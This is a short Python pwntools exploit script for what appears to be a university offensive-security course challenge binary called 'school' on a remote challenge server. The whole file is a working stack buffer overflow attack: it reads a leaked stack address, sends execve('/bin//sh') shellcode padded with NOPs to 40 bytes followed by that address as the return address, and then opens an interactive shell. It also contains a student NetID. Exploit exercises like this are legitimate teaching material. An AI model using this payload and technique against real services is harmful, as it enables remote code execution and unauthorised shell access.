import struct
from itertools import chain
from typing import Any, Iterable, List

from pwn import *

binary = './school'
context.binary = binary
context.terminal = ['tilix', '-e']

def flatten(items: Iterable) -> List[Any]:
    return list(chain.from_iterable(items))

def make_breakpoints(breakpoints: List[str]) -> List[str]:
    return list(map(lambda b: f'b* {b}', breakpoints))

def make_commands(args: List[str]) -> List[str]:
    return flatten(map(lambda a: ['-ex', a], args))

breakpoints = [
    # '&main',
    # '0x400654', # First printf
    # "0x400676", # printf Hi
    # "0x400665", # After gets
    "0x400681", # RET
]

print_statements = [
    'set follow-fork-mode parent'
]

breakpoints = make_breakpoints(breakpoints)
commands = make_commands(breakpoints + print_statements)

# with process(['pwndbg', binary] + commands) as p:
# with process([binary]) as p:
with remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1338) as p:

    is_remote = isinstance(p, remote)

    if is_remote:
        p.recvuntil(b'Please input your NetID (something like abc123): ')
        p.sendline(b'nf2137')

    if not is_remote:
        p.sendline(b'r')

    p.recvuntil(b"School's at: ")

    char_arr_start = int(p.recvline()[:14], 16)
    log.info("Starting address at: %s", hex(char_arr_start))

    # From https://www.exploit-db.com/shellcodes/47008
    shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

    log.info("Shellcode length: %d", len(shellcode))

    payload = shellcode
    payload += b'\x90' * (40 - len(shellcode))
    payload += struct.pack("<Q", char_arr_start)

    log.info("Payload length: %d", len(payload))

    p.sendline(payload)
    p.interactive()
